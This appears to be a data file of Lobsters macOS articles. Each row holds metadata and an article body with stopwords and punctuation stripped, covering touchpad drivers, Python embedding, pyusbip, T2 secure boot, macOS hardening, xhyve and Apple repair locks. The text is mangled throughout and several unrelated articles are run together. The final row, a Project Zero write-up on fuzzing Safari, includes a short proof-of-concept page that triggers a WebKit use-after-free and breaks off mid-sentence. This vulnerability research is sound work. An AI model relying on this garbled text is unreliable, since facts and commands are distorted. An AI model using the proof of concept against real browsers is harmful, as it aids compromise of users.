accidentally tap enabled tap click trouble install dispad daemon original author mtrack install addition dev dependency dispad sudo apt install libconfusedev libxidev get code cd tmp git clone http githubcombluedragonxdispadgit cd dispad compile daemon configure make sudo make install go ahead start dispad execute command terminal config file dispad created default option keep change option mine like poll delay lastly need start dispad automatically every time log go activity search open startup application add new entry name dispad command usrlocalbindispad optional comment remind mtrack config already gesture obvious left mouse click one finger tap right mouse two finger tap middle mouse three finger tap scroll two finger horizontal vertical drag three finger swipe left right finger simulate mouse button number mean navigate back forth browser many application mtrack simulate mouse button different gesture however ubuntu us mouse button make use gesture need additional tool xbindkeys xdotool luckily need manual compilation time open terminal install via command sudo apt install xbindkeys xdotool xbindkeys daemon listening input input device including keyboard mouse touchpad define rule input combination input match command executed xdotool come xdotool command line tool able simulate key input combining xbindkeys xdotool able map high mouse button certain shortcut suit need define rule need open xbindkeysconfig gui app define key listened action command give howto look provide current xbindkeys config copy save xbindkeysrc next workspace xdotool key superpagedown move next workspace xdotool key clearmodifiers supershiftpagedown control release previous workspace xdotool key superpageup move previous workspace xdotool key clearmodifiers supershiftpageup control release zoom xdotool key zoom xdotool key rule combined mtrack config assumption default shortcut ubuntu unchanged xbindkeys allow finger swipe switch next workspace finger swipe switch previous workspace holding ctrl finger swipe move active window next workspace holding ctrl finger swipe move active window previous workspace pinch scaling move finger closer trigger ctrl combination zoom browser reduce font size apps pinch scaling move finger away trigger ctrl combination zoom browser enlarge font size apps found use case rotating gesture button currently disabled finally forget add command usrbinxbindkeysautostart startup application automatically started reboot updated fwiw started support pixel perfect scrolling jumping pixel pixel scrolling many application greatly enhanced ux laptop user user trackpad however firefox default browser many linux distros still us jumping scroll fake smooth easing movement searched lot firefox support pixel perfect scrolling like macos found answer current fake smooth option thankfully got hint redditor replying post reddit reply point post quote know work firefox newer know earliest version support assume enabled default point yet firefox current nightly run command echo export sudo tee log back firefox use xinput optional open firefox go preference advanced preference browsing firefox nightly uncheck use smooth scrolling disables old style smooth scrolling cause annoying delay using style scrolling imo following step pixel pefect scrolling turned latest firefox working great final word whole setup multitouch touchpad made life linux lot easier however discovered issue mtrack driver lot use trivial dismiss whole experience scroll coast sometimes sticky make scroll move quickly subsequence scroll gesture dispad sometimes detect typing let caret jump finally may temporary since libinput wayland already chosen future actively developed revisit libinput get better multitouch support configuration mtrack way go
246,Lobsters,mac,Apple macOS,Embedding Python in a MacOS Application (2017),https://medium.com/python-pandemonium/embedding-a-python-application-in-macos-d866adfcaf94,embedding python macos application,embedding python macos application embedding python application macos cocoa application via pyinstaller mosaic shape macos python application straightforward http wwwpythonorgdownloads http wwwpyinstallerorg stackoverflow pythonorg documentation http apple documentation target http,embedding python macos applicationembedding python application macos cocoa application via pyinstallermosaic shape macos us pythonmosaic shape macos core written python ui written objectivec communicates nested python application via nstask nspipesit took considerable amount time cursing late night figure nest python application cocoa application due resultant sandbox constraint code signing issue find comprehensive solution online solve issue hope walkthrough help someone future sift google search resultsafter generating app pyinstaller nesting xcode calling python app via nstask straightforward however ready submit application store need properly set application sandbox entitlement codesign application nightmare usually beginsdownload python http wwwpythonorgdownloadsdownload pyinstaller http wwwpyinstallerorgthe default shipped python version macos hombrewcellar version python codesigning issue sandbox application error manifest nesting python application signing proper sandbox entitlement attempting call python application receive crash give archaic codesigning error referencing python stackoverflow make sure download python installer directly pythonorg case using yet test python downloading installing double check default python guppy dean dean python versionpython installed way default python interpreter explicitly specify python version use python virtualenvmkvirtualenv package python application replace parameter python pyinstallerpy runpy iconiconwindowedicns clean windowed onefile osxbundleidentifier commosaicmosaicshapes note sure icon file ready otherwise pyinstaller default icon additionally replace bundle id parent application bundle idembed resultant application xcode resource folder copy paste drag drop resultant app pyinstaller generate infoplist file navigate file xcode change executable file property remove macos leave executable name itunesconnect complain codesigning issue verification page submit applicationarchive application xcode going product archive export archive without resigning application last option export macos appa directory created applicationsoon sign package application need configure sandbox entitlementsthe parent entitlement file generated enable sandbox xcode parent entitlement list may differ mine depending requirement application apple pretty thorough documentation get initial violation errorsi copied file codesign directory reference easily code signing script little raw entitlement file parent use sign case allow user specify photo convert mosaic thus one property specify sandboxguppy dean cat desktoppentitlements xml version encoding doctype plist public appledtd plist http plist version dict key comapplesecurityappsandbox key true key comapplesecurityfilesuserselectedreadwrite key true dict plist child entitlement use sign python application withthe child entitlement contain two property specify sandbox inheritance apple documentation enable sandbox inheritance child target must use exactly two app sandbox entitlement key comapplesecurityappsandbox comapplesecurityinherit specify app sandbox entitlement system abort child process however confer capability child process way icloud notification entitlement guppy dean cat desktopcentitlements xml version encoding doctype plist public appledtd plist http plist version dict key comapplesecurityappsandbox key true key comapplesecurityinherit key true dict plist time sign package application submit app storei use following bash codesign script sign package application sure alter parameter need party mac developer application used apple store submission developer id application used distributing application outside apple store like sign developer id application first ensure everything installs properly prior submitting storea pkg file created current working directory upload package via application loader upload binary via xcode resign binary override exclude entitlement configured python application therefore use application loader quite process right
247,Lobsters,mac,Apple macOS,pyusbip,https://joshua0.dreamwidth.org/67264.html,pyusbip,work believe bob paper wireshark support usbip available github also email list hire consultancy accelerated tech,spent last thanksgiving week home family greater boston area wonderfully relaxing break goingson ordinary life bay area since planned get little bit work done client brought development board including lattice eval kit productive monday tuesday getting quite lot done testing simulation friday ready test hardware posed problem tool program bitstream onto board run window linux mac considered obvious solution problem weighed individual merit discarded chose complicated unreasonable approach possible great many reasonable option truly obvious thing would install linux vm mac attach device vm install programming software vm walk away happy opposed idea handful reason one poor old mac running disk space another ram seemed already struggling load approximately billion webviews bunch tab safari tab chrome handful slack instance electron app signal instance electron app grumble grumble webviewstakingovertheworld rant another post also nt want install virtualization software realized virtualization software mac already though docker mac installed know run linux machine somewhere least save disk space cost docker us virtualbox something inside right uh wrong dockermachine used virtualbox indeed hacky solution plumb usb device docker instance virtualbox feature gone docker mac since switched custom fork xhyve feature request open docker mac repo largely ignored activity coming bot trying hardest autoclose issue human trying best say still matter ok docker right wait second seem remember back corner mind linux support usbip thing look already multiplatform version someone implemented usboverip host controller driver window could theory share usb device physically attached linux machine give window machine linux machine linux machine presumably userspace tool something sharing little bit work could running mac aside astute observe plot already lost evk longer important thing happening usbip curious architecture went looking documentation information protocol work got classic believe bob answer information go read paper best tell usbip took architectural model nfs server export usb device client import present virtual usb host controller client machine tunnel request device network fundamental basis sound implementation architecture certainly artifact time world yet realization perhaps everything kernel nfs clientr life kernel course nfs server surely usbip client expose virtual hardware live kernel extension usbip server right architecture usbip everything built lived kernel module userspace tool existed point kernel right general direction certainly make task sharing usb device mac somewhat trickier theorized possible implement usbip userspace server using libusb found header file defined network protocol usbip turn wireshark support usbip three implementation wireshark window linux compare note figured give shot see far got luck ran finally started typing code friday night nearly got caught best approach oldhackermentality started visualizing way incrementally read packet c without decoded yet began preparing put together select loop wrapping around listen ing socket alreadyaccept ed socket also whatever file descripters libusb needed listen suddenly awakening fact use well anything nt c figured likely language binding needed python hope getting something quick dirty working going quickly closed usbipdc editor began googling python binding libusb quick side note whenever find asking question python binding foo probably nt bother ask answer probably yes old saying ask ten jew question get eleven answer seems true fact ask pypi one binding library get multitude approach one exactly enough function bound scratch extremely narrow itch one direct swig mapping function call crash one beautifully pythonic old version library complete right part coming pythonic interpretation c function suddenly becomes difficult one joyfully complete something messy approach documentation well original library documentation pretty good nt bother write guess docstrings mutter breath choose latter done thankful anyway turn writing network code python day nice asyncio basically want seems python battery finally included way async await keywords course still make pine firstclass coroutines lua yield point decorated function least better nothing general whole lot surprise confused pythonusb provided binding needed asynchronously submit usb request one thing caught usbip protocol fact two protocol discovery management protocol device may please claim device number seven actual usboverip protocol multiplexed socket link seems happpenstance packet format intermixed use identifier subopcodes ie usbipopimport would like device please usbipretsubmit usb request response asked opcode different header way tell apart opcodes actual usboverip protocol defined bit small first bit always management protocol first bit protocol version number yes embedded packet supposed nonzero exciting frustrating presumably era design code review linux kernel another surprise linux client little le stable hoped began sending usb data response puzzling result remote end suddenly stopped talking fact even went export reimport device remote end still refused talk would nt even send initial configuration request import packet took look dmesg noticed machine sitting mountain view emitting alarming message like task blocked second tried reload kernel driver client rmmod vhcihcd hung forever turn send incomplete usbip response packet say header without enough data follow disconnect end usb stack get stuck reboot kill count nt want reboot server machine quite yet since stuff thing made sense installed linux vm mac development saturday night finally enough protocol implemented talk usbserial chip kind sitting lattice board attached usbip device colo box sacramento ssh r port forwarding made first known usboverssh connection certainly first mac launched lattice programming software minute network latency round trip later successfully flashed new firmware onto board packed box board went bed since flight next morning saved hour flashing board evening would arrive home linux machine lived nt use plane pyusbip available github lightly tested mac o connected linux client currently support bulk endpoint control packet endpoint strongly suspect one quantitysingledigit people intentionally insmoded usbip driver nt dreamwidth account want get notified read thing like write also email list promise send mail thing write go blog sort skillset sound like kind development work business need hire consultancy accelerated tech promise pick efficient way get job done nt worry course client nt get billed little toy project
249,Lobsters,mac,Apple macOS,Secure Boot in The Era of The T2,https://duo.com/labs/research/secure-boot-in-the-era-of-the-t2,secure boot era,early boot appendix appendix,early boot launchd contains embedded property list command invoke earlyboot phase one macefi key macefi key dict key requiresuccess key true key programarguments key array string macefiutil string string string array key program key string usrbinmacefiutil string dict performing internal filesystem check setting data protection checking pending data wipe launchd invokes macefiutil macefiutil along nvram executable primary mean interacting uefi kernel component userland usage macefiutil hvc mefi path plist file name v nvram variable name w nvram variable name nvram variable value init initialize espi interface optional fully qualified path mefi plist file name parse passed plist add requested nvram variable v readvar nvram variable name read specified nvram variable w writevar nvram variable name nvram variable payload write specified payload nvram variable c clear clear entire nvram dictionary v version display version information application h help display list option may issue multiple command per invocation ie macefiutil plist file note macefiutil additional undocumented command line flag save restore management engine region alreadyloaded uefi payload option description g creates hash file original firmware vardb capture partition see n capture snapshot nvram vardb r restore snapshot nvram vardbnvramnewsnapshot capture snapshot partition ivbp mf flog utok swbg uep vardb q restores snapshot nvramnewsnapshot mepsvnsnapshot meivbpsnapshot memfssnapshot meflogsnapshot meutoksnapshot vardb loaded firmware image macefiutil invoked launchd done without optional image path invoking imported macefihostinterface efihostinterface initespifirmware char const null argument macefihostinterface appendix shared library originally located usrliblibmacefihostinterfacedylib runtime baked dynamic loader cache systemlibrarycachescomappledyld initespifirmware query device tree iodevicetree armioespi safcapable slaveattachedflash support found load uefi firmware package hash file macefihash usrstandalonefirmwaremacefi directory memory buffer invokes macefimanageruserclientlib initespi initespi call end macefimanageruserclient appendix initespi marshal data kernel context call macefimanager loadandverifypayload part macefimanager start initialization routine apple firmware update kernel extension afukext initialized postvalidation callback registered mefi section loadandverifypayload pass memorydescriptor containing content applefirmwareupdate loadfirmware performing signature validation using routine validate firmware update postvalidation callback macefimanager verifypayloadcallback executed assuming validation succeeded verifypayloadcallback copy content mefi section macefilandingmap configures espi dma engine back loadandverifypayload macefimanager initializes nvram storage mechanism populates section firmware image hotpatching indicator uefi image based bootp argument production fuse status void macefimanagerpatchlockindicator macefimanager manager lockindicatorvalue bool isprodfused manager fuseapproductionstatus bool isromlocked void espivirtualbaseaddress manager espiefilandingvirtualbaseaddress macefipayloadromsize manager macefipayloadsize isprodfused isromlocked peparsebootargn macefilocked isromlocked isromlocked lockindicatorvalue else lockindicatorvalue qword macefipayloadromsize espivirtualbaseaddress lockindicatorvalue lock indicator value get hot patched near end image utilization uefi boot process currently understood
250,Lobsters,mac,Apple macOS,Pretty iTerm2 with a modern titlebar,https://www.felixjung.io/posts/pretty-iterm2-with-a-modern-titlebar/,pretty modern titlebar,api change macos high sierra author promised changed upgrade macos mojave already install nightly build set theme set profile window style open new terminal window issue gitlab,new feature mojave allow configuring beautiful titlebar integrated tab matching theme color prettiest ever beenin previous post wrote customizing titlebar match current theme provided pretty neat visual upgrade brought user experience closer hyped beautiful hyper terminal emulator bei zeitco unfortunately api change macos high sierra stopped titlebar customization working author promised work change bringing feature back long time nothing seemed happen changed new combination feature setting nightly build allows configure beautiful terminal macos yet need macos mojave able final setup step need take get set upgrade macos mojave already upgrade went flawlessly seen positive report online get started open app store mac download macos mojave installer follow instruction install nightly build usually run nightly system great rarely cause problem set theme minimal go setting select appearance tab choose minimal theme dropdown set profile window style compact setting go profile tab choose window setting new window section select compact style dropdown open new terminal window point new terminal window look faily similar screenshot matching current theme additional advanced setting tweak get even closer adjust thing liking set final setup advanced setting enjoy amazingly beautiful terminal experience endless developer zen looking issue gitlab feature done yet experience might get even better stay tuned thanks much george nachman making great terminal emulator
251,Lobsters,mac,Apple macOS,Apple's new bootloader won't let you install GNU/Linux -- Updated,https://boingboing.net/2018/11/11/ring-minus-1.html,apple new bootloader wo nt let install gnulinux updated,chip possible install gnulinux apple new hardware security chip currently block linux booting,locking bootloaders trusted computing important step towards protecting user devastating malware attack allowing user verify computing environment trusted computing prevent compromise operating system lowlevel part computer operating environment every security measure difference secure user secure user bootloader protection nt allow owner decide signature trust security user security prevents user overriding manufacturer allows manufacturer lock user apple latest bootloader protection controversial chip good example chip come userinaccessible root trust allows installation apple microsoft operating system gnulinux open free alternative reason way google flagship pixel chromebooks come hardware switch activated bootup allow owner change signature system trust user initialize system password prevent others covertly altering trusted root later give user best world system default protects malware user choose allows nominate party google decide trust make thing worse publishing tool allow bootloader override legally risky section dmca provides year prison sentence fine first offense anyone trafficks tool override access control copyrighted work update possible install gnulinux disabling boot security altogether though tweaking required however unlike pixel ca nt manually install trusted signature bootloading security process apple documentation make clear explicitly mention linux note currently trust provided microsoft corporation uefi ca would allow verification code signed microsoft partner uefi ca commonly used verify authenticity bootloaders operating system linux variant word apple decides add certificate chip otherwise cracked could fully disabled allowed load arbitrary key good luck even able boot linux distribution new apple hardware apple new hardware security chip currently block linux booting michael larabelphoronix via twitter spanking president routinely disinformation tweet november election approach better late never today sunday twitter added disclaimer bogus donald trump tweet criticizing mail drop box ploy democrat disclaimer say tweet violates company civic election integrity many coronavirus party property rented service airbnb banning house party worldwide airbnb also filed preliminary paperwork public stock offering rather bold move company trying clean reputation comply coronavirusrelated limit gathering healthrelated disinformation content facebook received estimated billion view past year surged pandemic say advocacy group avaaz new report released wednesday read avaaz report facebook algorithm major threat public health reuters report found content superspreader site may federal law new car truck u must equipped rearview monitoring technology however still leaf million million vehicle produced two year ago without rearmounted sensor capable telling back bmw parking still nt climbed aboard robot vacuum cleaner bandwagon probably one question unleashing tiny carpet sucker home nag others actually good job le authority tech pcmag definitive statement saying robot vacuum year heard steady drumbeat need vpn protect online drilled u decade wake vpn keepsolid one world respected vpn provider jumped market new service called smartdns
252,Lobsters,mac,Apple macOS,Interface Hall of Shame - QuickTime 4.0 (1999),http://hallofshame.gp.co.at/qtime.htm,interface hall shame quicktime,favorite drawer realworld phenomenon subject constraint screen size sound image blank black screen thinking go somewhere else standard listbox go somewhere else gui gui organize favorite export group create playlist new window,part effort mimic appearance handheld consumer device designer quicktime player employed drawerlike interface element notable unquestionably single biggest blunder design application attempting mimic physical device favorite drawer favorite drawer intended provide user rapid access favorite multimedia file concept alone useful interface feature unfortunately virtue attempting mimic realworld device due complete lack familiarity basic design principle favorite drawer quicktime dismal failure designer provided smooth animation give appearance drawer opening bottom device much like one supposes panel might open handheld device much like phone number drawer used ibm realphone drawer demonstrates one distinct problem translating realworld phenomenon computer desktop realworld phenomenon subject constraint screen size extent drawer open therefore number item visible drawer function player located relation bottom screen want hold item drawer first position player near top screen want hold lot item drawer increase resolution monitor player positioned close bottom screen drawer simply open similarly current size player interfere user ability access item favorite drawer size player increased le screen real estate drawer open therefore fewer item drawer accessible problem would exist designer employed standard popup window contain user favorite problem direct expected result dogmatic adherence faulty design philosophy restricting realworld metaphor availing dynamic feature computer provide designer needlessly restricted utility usability software look arrangement item drawer demonstrates another fundamental problem translation physical device software favorite arranged matrix number element limited size screen physical item limited physical size virtual item list phonenumbers favorite limited amount computer memory designer provided standard list box would virtually limit number favorite user could maintain furthermore availing standard gui element designer could provided great deal additional functionality organizing favorite whatever construct user wish employ creating playlist item played successively computer software ideal platform offer functionality adherence physical device designer quicktime player like realthings apologist made software woefully inept area greatly excel image favorite drawer despite appearance entirely meaningless quicktime player assigns image item represent sound file sound file however assigned image program provides mean user substitute meaningful image hand image used represent given movie thumbnail image first frame movie surface may seem appropriate one look collection movie movie downloaded especially apple begin blank black screen first frame remainining movie constituted copyright notice especially unrecognizeable reduced thumbnail size thinking image drawer indicate little fact drawer contains item completely inexplicable reason designer feel important display title description item designer provide secondary mean drawer tooltips balloon help message status bar distinguish various title result inappropriate application realworld metaphor simply pitiful design balloon help would certainly help user would still require user pas cursor image desired target could located since balloon help requires intervention user effective regarded little quick fix substitute appropriate design favorite function lack meaningful description item force user rely physical position item matrix unfortunately user resizes player window number image row drawer may may change end result user longer rely image position aid identification item third row bottom might resizing appear second row lack label reliable positioning information selecting particular movie sound file favorite drawer unlike trying find caramelfilled chocolate sampler box chocolate expressed forest gump movie bearing name mama always said life like box chocolate never know going get reliable mean finding particular type chocolate either bite least press thumb bottom hope nobody notice later similarly reliable mean user identify file choice favorite drawer open several happens upon file interest designer concerned user objective point interaction quicktime player specifically ability rapidly locate open particular file interest favorite drawer would never seen light day unfortunately designer far interested form function looking good considered important working well application provide additional mean determine name one favorite medium file user must go somewhere else application menu bar offer function labelled organize favorite selected provides standard listbox containing name favorite listbox allows user rename favorite delete favorite list reorder item list function notably unavailable favorite drawer organize favorite dialog without design problem surprisingly organize favorite dialog allow user add favorite list user go somewhere else item list reordered indication provided possible example failure pay attention gui designer allow user make multiple selection listbox delete one item time move one item time additional design inadequacy dialog discussed limitation aside designer need add ability launch favorite organize favorite dialog change title dialog favorite burn source code drawer exponentially improve utility usability favorite function designer complete gui might want provide user ability organize favorite category export group favorite share others add ability create playlist open favorite new window dealing computer realworld physical device anything possible
253,Lobsters,mac,Apple macOS,Hardening macOS,https://blog.bejarano.io/hardening-macos.html,hardening macos,hardening macos update blog post update update bad guy device secure warning openbsd disclaimer install fresh copy macos note recovery mode utility firmware password utility format boot drive install macos first boot clear nvram create administrator user account system preference user group apple system preference user group guest user system preference software update system preference security privacy general system preference security privacy general system preference security privacy firewall system preference security privacy firewall firewall system preference security privacy privacy location system preference security privacy privacy analytics system preference sharing system preference sharing system preference network advanced dns system preference spotlight search result system preference general system preference bluetooth finder preference advanced disable captive portal disable crash reporter block malicious domain name stevenblackhosts outbound firewall little snitch lulu binary whitelisting googlesanta system preference security privacy filevault secure filevault ssh sshagent unpatched vulnerability log back unprivileged user second boot user system preference security privacy privacy contactscalendarsremindersphotos system preference security privacy privacy cameramicrophone system preference security privacy privacy full disk access system preference security privacy privacy advertising install web browser thirdparty cooky dns preloading flash ad blocker track telemetry vpn vpn comparison privacyrespecting email service provider email comparison pgpgpg encryption email keep system uptodate prevent unattended physical access device encrypt sensitive data backup data keep guard reading contact,hardening macos sat sep update sat may added workaround unpatched gatekeeper bypass published filippo cavallarin blog post update mon oct extra advice added automatic update sharing privacy setting guest user account fixing particular misconfiguration sshagent reading section end update tue oct minor update made based general feedback thanks everyone collaborated hesitate contact find anything else modified bad guy want steal data money identity bad guy come different background known criminal others government ad company device secure never going lie guide silver bullet thing completely secure system said make lot harder bad guy steal guide made warning threat model statesponsored agency better without macos see openbsd disclaimer step might mildly detriment user experience security always convenience tradeoff step may require extra research always follow trusted source install fresh copy macos note step optional highly recommended best start clean system avoid possible misconfiguration boot recovery mode hold command r boot optional go utility firmware password utility consider setting firmware password protect data lost stolen format boot drive install macos scratch warning step permanently delete content boot drive first boot clear nvram hold command p r boot skip set firmware password previously create administrator user account strong password hint user administration purpose go system preference user group create unprivileged user account daytoday use considered best practice apple go system preference user group guest user uncheck allow guest log computer go system preference software update consider enabling automatic update comfortable enabling consider least turning security update going checking install system data file security update go system preference security privacy general set require password sleep immediately second go system preference security privacy general set allow apps downloaded app store app store identified developer go system preference security privacy firewall turn firewall go system preference security privacy firewall firewall check block incoming connection go system preference security privacy privacy location uncheck enable location service go system preference security privacy privacy analytics uncheck share mac analytics go system preference sharing anonymize computer name name see connected network go system preference sharing turn every service turn using disable afterwards go system preference network advanced dns add two entry dns server remove server go system preference spotlight search result uncheck spotlight suggestion allow spotlight suggestion look go system preference general uncheck allow handoff mac icloud device go system preference bluetooth turn bluetooth turn using disable afterwards go finder preference advanced check show filename extension disable captive portal use browser instead disable crash reporter block malicious domain name using etchosts file see stevenblackhosts consider running outbound firewall little snitch proprietary fullfeatured lulu opensource basic consider binary whitelisting googlesanta go system preference security privacy filevault turn filevault note may take time secure filevault sleep plan using ssh sshagent add safe timeout parameter sshagent protect credential edit etcautomaster root comment line beginning net note workaround unpatched vulnerability reboot log back unprivileged user second boot user go system preference security privacy privacy contactscalendarsremindersphotos remove apps access folder go system preference security privacy privacy cameramicrophone remove app want access camera microphone go system preference security privacy privacy full disk access remove app want fulldisk access go system preference security privacy privacy advertising check limit ad tracking click reset advertising identifier carefully ass install web browser regardless thirdparty cooky dns preloading flash support ad blocker track telemetry using privacyrespecting search engine lieu google whitelist approach javascript execution note using safari go safari preference search uncheck include safari suggestion safari preference general uncheck open safe file downloading consider tunneling traffic vpn connected untrusted network see thatoneprivacyguy vpn comparison roll consider using privacyrespecting email service provider see thatoneprivacyguy email comparison roll consider setting pgpgpg encryption email regardless email service provider secure system lot harder screw everyone else city keep mind securing system onetime job must actively backup data patch system look new general best practice keep system uptodate macos installed software prevent unattended physical access device anyone encrypt sensitive data rest transit backup data multiple encrypted course copy data different physical location keep guard system last line defense reading interested macos security may enjoy try keep guide upgraded keep modern threat new macos release thanks reading feel free contact wrong something doubt nice day copyright ricard bejarano
254,Lobsters,mac,Apple macOS,"Running FreeBSD on OSX using xhyve, a port of bhyve",https://dan.langille.org/2018/10/02/running-freebsd-on-osx-using-xhyve-a-port-of-bhyve/,running freebsd osx using xhyve port bhyve,bhyve xhyve macports trouble xhyve homebrew installing xhyve background information creating virtual disk freebsd running xhyve tutorial install script running script running installed instance,bhyve hypervisorvirtual machine manager developed freebsd xhyve port bhyve o x built top hypervisorframework o x yosemite higher run entirely userspace dependency usually use macports ran trouble xhyve morning tried homebrew instead installing homebew often referred brew outside scope please refer documentation installing xhyve install xhyve dan brew install head xhyve cloning http cloning usersdanlibrarycacheshomebrewxhyve git checking branch master already master branch date originmaster make file built second dan background information create two script install script run xhyve install freebsd run script run installed instance freebsd freebsd installed filebased filesystem yes create file freebsd installed bhyve documentation referred virtual disk need obtain copy install medium freebsd grabbed creating virtual disk wanted drive installing copy freshports database within freebsd instance considered running postgresql natively osx would prefer keep everything within freebsd freebsd running xhyve tutorial showed create virtual disk based used command dan xhyve mkfile nv cuppyimg cuppyimg byte putting xhyve work xhyve choice suit whatever want choose install script create install script make easier typing everything one command xhyvecuppyinstallsh based upon found xhyve tutorial mentioned binsh uuid u deaddeaddeaddeaddeaddeaddeaddead userboot bootvolume img usersdanxhyvecuppyimg kernelenv mem smp c pcidev hostbridge lpc net virtionet imgcd ahcicd imghdd virtioblk img lpcdev l stdio acpi xhyve acpi mem smp pcidev lpcdev net imgcd imghdd uuid f fbsd userboot bootvolume kernelenv note positive description correct line sure need uuid line userboot point userbootso file supplied xhyve installation may vary line bootvolume indicates image boot case freebsd install image line img virtual disk install created using mkfile img used within imghdd parameter see line mem system ram line smp system two cpu line imgcd image presented cd line imghdd definition hard drive image virtual disk know imgcd userboot need specified running script run script immediately presented freebsd splash screen freebsd splash screen shortly thereafter get select console type pressed enter console type begin freebsd install process detail step outside scope post freebsd installer install script completes back command line install completed running installed instance create run script copied install script modified slightly cp xhyvecuppyinstallsh xhyvecuppysh commented imgcd parameter changed bootvolume dan xhyve cat xhyvecuppysh binsh uuid u deaddeaddeaddeaddeaddeaddeaddead img usersdanxhyvecuppyimg userboot bootvolume img kernelenv mem smp c pcidev hostbridge lpc net virtionet imgcd ahcicd imghdd virtioblk img lpcdev l stdio acpi xhyve acpi mem smp pcidev lpcdev net imgcd imghdd uuid f fbsd userboot bootvolume kernelenv see moved img bootvolume start newlyinstalled freebsd service ran command xhyvexhyvecuppysh splash screen start soon login prompt installed instance look like zpool detail insight parameter script please let know update post install jail get instance speed thank helped
255,Lobsters,mac,Apple macOS,New Macbooks and iMacs will brick themselves if they think they're being repaired by an independent,https://boingboing.net/2018/10/04/welcome-bootlickers.html,new macbooks imacs brick think repaired independent,apple new proprietary software lock kill independent repair new macbook pro,last year apple outraged independent technician updated iphone design prevent third party repair adding feature allowed handset detect screen swapped even swapped original applemanufactured screen refuse function got official apple unlock code system come macbook pro imac pro thanks security chip render system nonfunctional replacing keyboard screen case component proprietary apple configuration tool used unlock system apple tell customer computer sell designed punish opting get property repaired independent technician detail came leaked service manual two possible explanation continued campaign obsolescence want control ecosystem bring repair network control kyle wiens ceo ifixit told phone another security nt see security model nt trust owner device making much sense apple new proprietary software lock kill independent repair new macbook pro jason koeblermotherboard apple today became first dollar american company becoming first trillion dollar u company two year ago microsoft amazon second third place respectively breaking news apple worth trillion doubled value since pandemicinduced recession cementing dominance global epic game rejected apple app tax past epic owned every single partner vendor managed hold value anyone remember twitch streamer organized esports epic took whole pie epic may close winning next round entertainment advertising epic claim google forced oneplus break deal fortnite launcher would preinstalled oneplus phone project manager lot responsibility plate hipdeep major project ride herd project also need constantly gather data analyze result modify process report back various project stakeholder difficult position may federal law new car truck u must equipped rearview monitoring technology however still leaf million million vehicle produced two year ago without rearmounted sensor capable telling back bmw parking still nt climbed aboard robot vacuum cleaner bandwagon probably one question unleashing tiny carpet sucker home nag others actually good job le authority tech pcmag definitive statement saying robot vacuum
256,Lobsters,mac,Apple macOS,365 Days Later: Finding and Exploiting Safari Bugs using Publicly Available Tools,https://googleprojectzero.blogspot.com/2018/10/365-days-later-finding-and-exploiting.html,day later finding exploiting safari bug using publicly available tool,,posted ivan fratric google project zero around year ago published result research resilience modern browser dom fuzzing wellknown technique finding browser bug together bug statistic also published domato dom fuzzing tool used find bug given previous research apple safari specifically webkit dom engine noticeably worse browser decided revisit year using exactly methodology exactly tool see whether anything changed test setup original research fuzzing initially done webkitgtk crash tested apple safari running mac make fuzzing setup easier webkitgtk us dom engine safari allows fuzzing regular linux machine research webkitgtk version used downloaded improve fuzzing process couple custom change made webkitgtk normally dom bug cause crash due multiprocess nature webkit web process would crash main process would continue running code added monitor web process crash code would crash main process status previous research published got lot question detail fuzzing setup time publishing change made webkitgtk code well detailed build instruction patch file found note patch made webkitgtk might work version webkitgtk code prepared built asan running following command webkitgtk directory export ccusrbinclang export cxxusrbinclang export cflags fsanitizeaddress export cxxflags fsanitizeaddress export ldflags fsanitizeaddress export asanoptions mkdir build cd build cmake dcmakebuildtyperelease dcmakeinstallprefix dcmakeskiprpathon dportgtk dlibinstalldirlib duselibhyphenoff denableminibrowseron dusesystemmallocon denablegeolocationoff denablegtkdocoff denableintrospectionoff denableopengloff denablecredentialstorageoff denablegamepaddeprecatedoff denablemediastreamoff denablewebrtcoff denablespellcheckoff denablevideooff denablewebaudiooff duselibnotifyoff denablesubtlecryptooff wnodev make j mkdir p cp binwebkit process first time cmakemake step likely complain missing dependency install might note lot feature deemed overly important dom fuzzing disabled via denable flag mainly save u install corresponding dependency case also create build portable build completes fuzzing simple creating sample domato running target binary asansymbolizerpathpathtollvmsymbolizer ldlibrarypathlib binwebkitfuzz pathtosample timeout waiting exit code take look command line well change made webkitgtk code indicates asan crash collecting crash asan build recent webkit source code created actual mac hardware simple running toolsscriptssetwebkitconfiguration release asan toolsscriptsbuildwebkit crash obtained webkitgtk tested mac build reporting apple result running fuzzer iteration year ago ended unique bug reported apple last year estimated computational power perform number iteration could purchased probably changed amount well within payment range wide range attacker varying motivation bug summarized table please note bug fixed time release blog post project zero bug id cve type affected safari older month older year uaf yes yes uaf uaf yes uaf yes yes uaf yes yes uaf uaf yes yes uaf yes yes oob read yes yes yes uaf useafterfree oob outofbounds seen table bug found affected release version apple safari directly affecting safari user bug depending count significantly le found year ago still respectable number bug especially take account fuzzer public long time result looked long bug webkit codebase check bug tested version webkitgtk month old webkitgtk well version year old webkitgtk result bug sitting webkit codebase longer month however older year might important note throughout past year previous blog post also fuzzing run using approach reported bug unfortunately impossible know many bug would survived many would found fuzz run also possible newly found bug actually older trigger provided pocs older version due unrelated code change dom investigate possibility however even assume previously reported bug would survived result still indicate security vulnerability keep getting introduced webkit codebase b many bug get incorporated release product caught internal security effort unusual piece software change rapidly dom engine b might indicate need put computational resource fuzzing andor review release exploit prove bug like indeed lead browser compromise decided write exploit one goal write reliable sophisticated exploit highly advanced attacker would likely choose use bug found public tool whose lifetime expected relatively short however someone exploit writing skill use bug example malware spreading campaign could potentially lot damage even unreliable exploit issue affecting release version safari selected believed easiest one useafterfree unlike useafterfree issue found freed object isolated mitigation recently introduced webkit make useafterfree exploitation harder let u first start examining bug going exploit issue useafterfree svganimateelementbase resetanimatedtype function look code function going see first function get raw pointer svganimatedtypeanimator object line svganimatedtypeanimator animator ensureanimator towards end function animator object used obtain pointer svganimatedtype object unless one already exists line manimatedtype animator constructfromstring basevalue problem two line attackercontrolled javascript code could run specifically could happen call computecsspropertyvalue javascript code could cause svganimateelementbase resetanimatedpropertytype called would delete animator object thus constructfromstring function would called freed animator object typical useafterfree scenario least first glance bit bug though get later vulnerability fixed latest safari longer triggering javascript callback computecsspropertyvalue instead event handler going processed later time patch seen simple proof concept vulnerability body onload settimeout go svg id svg animate id animate attributename fill svg div id inputparent onfocusin handler input id input div script function handler animatesetattribute attributename fill function go inputautofocus true inputparentafter inputparent svgsetcurrenttime script body svgsetcurrenttime result resetanimatedtype called turn due dom mutation made previously cause javascript event handler called event handler animator object deleted resetting attributename attribute animate element since constructfromstring virtual method svganimatedtype class primitive vulnerability give u virtual method call freed object day aslr vulnerability would immediately exploitable replacing freed object data control faking virtual method table freed object virtual method called execution redirected attacker rop chain due aslr know address executable module process classic way overcome combine useafterfree bug 